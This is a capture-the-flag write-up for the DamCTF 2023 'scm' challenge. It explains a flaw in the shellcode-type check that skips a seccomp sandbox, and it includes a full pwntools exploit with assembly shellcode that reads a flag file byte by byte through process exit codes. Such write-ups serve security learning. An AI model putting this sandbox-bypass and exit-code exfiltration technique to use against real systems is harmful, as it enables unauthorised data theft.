For this challenge, we are given a binary `scm` with a corresponding libc library file.

>`Keeping track of your different shellcode payloads is annoying, but the SCM is here to help!`
>
>`nc  chals.damctf.xyz 30200`
>
>Downloads:
>[scm](https://gitlab.com/osusec/damctf-2023-challenges/-/raw/main/binary/scm/scm?inline=false), [libc.so.6](https://gitlab.com/osusec/damctf-2023-challenges/-/raw/main/binary/scm/libc.so.6?inline=false)

---

### Recon

Decompilling the binary, we find it to be stripped. To make the code easier to read, I've gone through and "unstripped" the binary to the best of my ability.
te
The main function leads straight into another function, which I have titled `menu`:

```c
long menu(void)

{
  int choice;
  long keep_running;
  
  choice = selection();
  switch(choice) {
  default:
    keep_running = 1;
    break;
  case 1:
    add_shellcode();
    keep_running = 1;
    break;
  case 2:
    edit_shellcode();
    keep_running = 1;
    break;
  case 3:
    execute_shellcode();
    keep_running = 1;
    break;
  case 4:
    show_shellcodes();
    keep_running = 1;
    break;
  case 5:
    delete_shellcode();
    keep_running = 1;
    break;
  case 6:
    keep_running = 0;
    break;
  case 7:
    mystery();
    keep_running = 1;
  }
  return keep_running;
}
```

To anyone familier with heap-exploitation, this would seem to be a classical heap-note challenge. Investigating the functions seem to confirm this, namely due to the use of malloc to store structures:

```c
uint * get_shellcode(void)

{
  long lVar1;
  uint *shell;
  long buff_int;
  void *shellcode;
  long in_FS_OFFSET;
  char buff [50];
  uint size;
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  buff._0_16_ = ZEXT816(0);
  buff._16_16_ = ZEXT816(0);
  buff._32_16_ = ZEXT816(0);
  buff._48_2_ = 0;
  shell = (uint *)malloc(16);
  printf("Shellcode type (1=simple, 2=read, 3=write): ");
  fgets(buff,49,stdin);
  buff_int = strtol(buff,(char **)0x0,10);
  shell[1] = (int)(char)buff_int;
  if ((int)(char)buff_int - 0x1U < 3) {
    printf("Size of shellcode: ");
    buff._0_16_ = (undefined  [16])0x0;
    buff._16_16_ = (undefined  [16])0x0;
    buff._32_16_ = (undefined  [16])0x0;
    buff._48_2_ = 0;
    fgets(buff,49,stdin);
    buff_int = strtol(buff,(char **)0x0,10);
    *shell = (uint)buff_int;
    if ((uint)buff_int - 1 < 99) {
      printf("Shellcode: ");
      size = *shell;
      shellcode = malloc((ulong)size);
      *(void **)(shell + 2) = shellcode;
      read(0,shellcode,(ulong)size);
    }
    else {
      puts("Bad size!");
      free(shell);
      shell = (uint *)0x0;
    }
  }
  else {
    puts("Bad type!");
    free(shell);
    shell = (uint *)0x0;
  }
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return shell;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

The program allows us to store shellcodes, defining them as either simple, read or write. We can then specify a size, with a second chunk storing the shellcode we input.

Looking past the heap, we can then investigate the execution of our shellcode. As arbitrary shellcode would be too powerful for this challenge, the program obviously puts some restrictions down:

```c
void run_shellcode(uint *shell)

{
  char res;
  __pid_t pid;
  undefined8 *buff;
  ulong uVar1;
  undefined8 *puVar2;
  long in_FS_OFFSET;
  byte bVar3;
  uint status;
  long local_20;
  uint type;
  
  bVar3 = 0;
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Running shellcode...");
  buff = (undefined8 *)mmap((void *)0x0,4096,7,33,-1,0);
  *buff = 0xc3c3c3c3c3c3c3c3;
  buff[511] = 0xc3c3c3c3c3c3c3c3;
  puVar2 = (undefined8 *)((ulong)(buff + 1) & 0xfffffffffffffff8);
  for (uVar1 = (ulong)(((int)buff - (int)(undefined8 *)((ulong)(buff + 1) & 0xfffffffffffffff8)) +
                       0x1000U >> 3); uVar1 != 0; uVar1 = uVar1 - 1) {
    *puVar2 = 0xc3c3c3c3c3c3c3c3;
    puVar2 = puVar2 + (ulong)bVar3 * -2 + 1;
  }
  memcpy(buff,*(void **)(shell + 2),(ulong)*shell);
  pid = fork();
  if (pid != 0) {
    wait(&status);
    puts("done!");
    printf("Execution finished with status code %d\n",(ulong)status);
    if (local_20 == *(long *)(in_FS_OFFSET + 0x28)) {
      return;
    }
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  close(2);
  if ((shell[1] == 3) || (close(1), shell[1] != 2)) {
    close(0);
    type = shell[1];
    if (type == 3) {
      res = shellcode_seccomp(0,1);
      goto joined_r0x00101408;
    }
    if ((int)type < 4) {
      if (type == 1) {
        res = shellcode_seccomp(0,0);
        goto joined_r0x00101408;
      }
      if (type == 2) goto LAB_0010141c;
    }
  }
  else {
LAB_0010141c:
    res = shellcode_seccomp(1,0);
joined_r0x00101408:
    if (res == '\0') goto LAB_00101438;
  }
  (*(code *)buff)();
LAB_00101438:
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

The program mmap's a dedicated chunk of memory for our shellcode, populating it exclusively with 0xc3, corresponding to the `ret` instruction. It then forks, the parent waiting for the child to complete.

Here comes the restrictions. It first closes stderr, then, depending on whether the shellcode type is read, write or simple, it closes either stdout, stdin or both. This is a crucial detail for this challenge. Reading the code during the ctf, I mistakingly concluded that both stdin and stdout would be closed, no matter what, leading me to question the functionality of shellcode types. This would also shape our teams solution.

After closing standard file descriptors, the program calls another function, `shellcode_seccomp`:

```c
long shellcode_seccomp(char read,char write)

{
  int res;
  long sec;
  long success;
  
  sec = seccomp_init(0x80000000);
  success = 0;
  if (sec != 0) {
    res = seccomp_rule_add_exact(sec,0x7fff0000,231,0);
    success = 0;
    if (-1 < res) {
      if ((read != '\0') && (res = seccomp_rule_add_exact(sec,0x7fff0000,0,0), res < 0)) {
        return 0;
      }
      if ((write != '\0') && (res = seccomp_rule_add_exact(sec,0x7fff0000,1,0), res < 0)) {
        return 0;
      }
      res = seccomp_load(sec);
      success = 0;
      if (-1 < res) {
        seccomp_release(sec);
        success = 1;
      }
    }
  }
  return success;
}
```

This function creates a strict seccomp ruleset, allowing either read, write or none of the two syscalls. It additionally allows syscall 231, exit_group, most likely to call `exit` at the very end. Of course, this leads to the question, what can we do with these syscalls?

---

### Vulnerability

Our team initially thought of the challenge as a heap exploitation challenge. Due to my oversight in `run_shellcode`, I came up with the idea to leak addresses through the exit_group syscall, as the main process prints the status code of the child. Combining this with something like an arbitrary write through heap exploitation, we could perhaps pop a shell (though maybe not).

In the end, no heap vulnerability seemed present; the code was rock solid. We did, however, discover a vulnerability in the edit function:

```c
    choice = prompt_string("Do you want to change the shellcode type?");
    if (choice != '\0') {
      printf("Shellcode type (1=simple, 2=read, 3=write): ");
      buff._0_16_ = (undefined  [16])0x0;
      buff._16_16_ = (undefined  [16])0x0;
      buff._32_16_ = (undefined  [16])0x0;
      buff._48_2_ = 0;
      fgets(buff,49,stdin);
      buff_int = strtol(buff,(char **)0x0,10);
      if (2 < (byte)((char)buff_int - 1U)) {
        puts("Bad type!");
        choice2 = 0;
        goto LAB_0010179a;
      }
```

As ghidra can be quite aggressive, I didn't initially spot the problem. It turns out, however, that the type cast to byte in the last comparison, is exactly what it seems. Inspecting the disassembly:

```asm
        0010175e e8 bd f9        CALL       libc.so.6::strtol                                long strtol(char * __nptr, char 
                 ff ff
        00101763 48 89 c3        MOV        RBX,RAX
        00101766 8d 40 ff        LEA        EAX,[RAX + -0x1]
        00101769 3c 02           CMP        AL,0x2
        0010176b 77 52           JA         LAB_001017bf
```

It indeed compares the `AL` register, that being the first byte of `RAX`. However, when it further down stores the value, it does something else:

```asm
        00101780 89 5d 04        MOV        dword ptr [RBP + 0x4],EBX
```

It instead stores `EBX`, that being the first four bytes of `RBX`. As a result, specifying a value such as 0xff01 would result in a successful comparison, after which the whole value would be stored. To see why this is critical, we must go back to `run_shellcode`:

```c
  close(2);
  if ((shell[1] == 3) || (close(1), shell[1] != 2)) {
    close(0);
    type = shell[1];
    if (type == 3) {
      res = shellcode_seccomp(0,1);
      goto joined_r0x00101408;
    }
    if ((int)type < 4) {
      if (type == 1) {
        res = shellcode_seccomp(0,0);
        goto joined_r0x00101408;
      }
      if (type == 2) goto LAB_0010141c;
    }
  }
  else {
LAB_0010141c:
    res = shellcode_seccomp(1,0);
joined_r0x00101408:
    if (res == '\0') goto LAB_00101438;
  }
  (*(code *)buff)();
LAB_00101438:
                    /* WARNING: Subroutine does not return */
  exit(0);
```

Following the flow, the program only calls `shellcode_seccomp` if the type is either 1, 2 or 3. For any other value, the function is never called, meaning, that there is no protection in place, allowing us to execute whatever we want.

---

### Exploitation

Assuming that stdin, stdout and stderr is closed, our team went ahead with more creative methods of exploitation. Our first method, was to reopen stdin and stdout through an interesting method described [here](https://github.com/0xBADCA7/ctf-3/blob/master/TokyoWesterns18/pwn/load/Readme.md). We initially saw success, being able to pop a somewhat usable shell on our local machines. However, we were met with disapointment, as the exploit never functioned on remote.

As a result, we moved to more desperate measures. Here, we fully utilized the opening created by exit_group.

With restrictions lifted from our shellcode, we concluded, that we could simply read the flag, byte by byte, by calling exit_group with the given byte of the flag. We could then decode the result, and voila, we would have the flag. This assumed that we knew the path to the flag, which we guesed would be "./flag", given the previous binary challenges.

---

### Solution

Performing this exploit, we ran into the problem, that the program would disconnect after executing the shellcode 13 times. Exactly 13 times. This is either a bug or intentional. One of us chose to simply reconnect after every byte, I simply chose to limit the number of bytes read to 13 bytes. 

```python
from pwn import *

context.log_level = "error"
elf = context.binary = ELF("./scm_patched")
libc = ELF("./libc.so.6")

context.gdbinit = "~/tools/peda/peda.py"
# conn = gdb.debug("./scm_patched", '''
# set follow-fork-mode child
# ''')

conn = process("./scm_patched")
# conn = connect("chals.damctf.xyz", 30200)

shellcode = asm('''
    xor rax, rax
    add al, 2
    xor rsi, rsi
    lea rdi, [rip + file]
    syscall

    xor rdi, rdi
    lea rsi, [rip + buff]
    xor rdx, rdx
    add rdx, 100
    syscall

    lea rdx, [rip + buff]
    add rdx, 0xde
    mov rdi, [rdx]
    xor rax, rax
    add al, 231
    syscall

    file:
    .ascii "./flag"
    .byte 0x0
    buff:
    .byte 0x0
''')

p1, p2 = shellcode.split(b"\xde")  # Split lea offset to target specific bytes

conn.recvuntil(b": ")
conn.sendline(b"1")  # Create new shellcode

conn.recvuntil(b": ")
conn.sendline(b"1")  # Type 1, simple

conn.recvuntil(b": ")
conn.sendline(b"10")  # Length of shellcode

conn.recvuntil(b": ")
conn.sendline(b"lulz")  # Random shellcode, will be changed

conn.recvuntil(b": ")
conn.sendline(b"2")  # Edit shellcode

conn.recvuntil(b": ")
conn.sendline(b"0")  # Shellcode at index 0

conn.recvuntil(b": ")
conn.sendline(b"y")  # y/n edit type

conn.recvuntil(b": ")
conn.sendline(b"65281")  # 0xff01, any value to break the comparison

conn.recvuntil(b": ")
conn.sendline(b"n")  # y/n edit shellcode

for i in range(13):  # Remote seemed to crash after 13 bytes leaked
    conn.recvuntil(b": ")
    conn.sendline(b"2")  # Edit shellcode

    conn.recvuntil(b": ")
    conn.sendline(b"0")  # Shellcode at index 0

    conn.recvuntil(b": ")
    conn.sendline(b"n")  # y/n edit type

    conn.recvuntil(b": ")
    conn.sendline(b"y")  # y/n edit shellcode

    conn.recvuntil(b": ")
    conn.sendline(str(len(shellcode)).encode())  # Length of payload

    conn.recvuntil(b": ")
    conn.sendline(p1 + bytearray((i, )) + p2)  # Insert specific byte index to read

    conn.recvuntil(b": ")
    conn.sendline(b"3")  # Execute shellcode

    conn.recvuntil(b": ")
    conn.sendline(b"0")  # Shellcode at index 0

    conn.recvuntil(b" code ")
    leak = conn.recvline()[:-1]
    leak = chr(int(leak) >> 8)
    print(leak, end="")

    if leak == "}":  # We have reached the end
        print()
        break

conn.recvuntil(b": ")
conn.sendline(b"6")  # Exit the program
```

Running it once, should give the first 13 characters in the flag. The line specifying byte index can simply be changed (e.g. `bytearray((i + 13, ))` to offset by 13) to read the segments sequentially. Running the exploit a few times, incrementing the offset by 13 each time, I eventually got the flag. I was, however, just 10 minutes late to the punch, the challenge being solved by one of my teammates.

---

### Note

As I mentioned earlier, I mistakingly thought that stdin and stdout would always be closed., which is not the case. As i read on the official discord, the intended solution is to split the exploit into multiple parts: 1 to open and read the flag, another to write the flag to stdout. The first would use the overflow in the edit function to allow the open syscall, the other would be of type write. As mmap memory segments are predictable, the second shellcode can read a flag deposited by the first shellcode. This is possible, because of how mmap can share memory between the processes. I initially though this was impossible, guess I learned something new :)

Funnily enough, the only other solution I could find used the exact same exploit described in this writeup. Goes to show that vulnerabilities are everywhere.